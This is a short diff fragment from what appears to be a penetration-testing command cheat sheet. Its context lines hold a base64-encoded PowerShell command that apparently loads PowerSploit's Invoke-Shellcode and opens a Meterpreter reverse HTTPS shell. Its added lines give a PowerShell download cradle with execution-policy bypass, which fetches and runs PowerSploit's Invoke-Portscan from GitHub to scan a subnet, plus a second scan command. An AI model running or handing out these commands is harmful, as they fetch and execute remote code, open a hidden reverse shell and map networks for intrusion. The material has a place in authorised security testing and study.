@@ -44,3 +44,10 @@ LwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEMAbwBkAGUARQB4AGUAYwB1AHQA
 UwBoAGUAbABsAGMAbwBkAGUALgBwAHMAMQApADsASQBuAHYAbwBrAGUALQBTAGgAZQBsAGwAYwBvAGQAZQAgAC0AUABhAHkAbABvAGEAZAAgAHcA
 aQBuAGQAbwB3AHMALwBtAGUAdABlAHIAcAByAGUAdABlAHIALwByAGUAdgBlAHIAcwBlAF8AaAB0AHQAcABzACAALQBMAGgAbwBzAHQAIAAxADkA
 MgAuADEANgA4AC4AMQAuADEAIABMAHAAbwByAHQAIAA4ADAAIAAtAEYAbwByAGMAZQAKAA==
+
+//PowerSploit 的Invoke-portscan.ps1進行掃描
+powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -port '445,3389,80,443' -oA C:\windows\tmp\res.txt"
+//
+//
+Invoke-PortScan -StarAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost
+//
